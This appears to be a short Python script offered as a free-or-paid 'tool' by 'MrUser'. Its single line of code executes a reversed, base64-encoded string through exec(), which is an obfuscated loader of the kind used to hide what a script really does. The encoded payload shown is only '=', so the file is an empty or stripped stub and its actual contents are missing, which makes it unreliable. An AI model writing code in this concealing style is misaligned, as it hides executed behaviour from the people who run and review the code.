# Created by MrUser#
#You can use this tool for free and paid#'
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))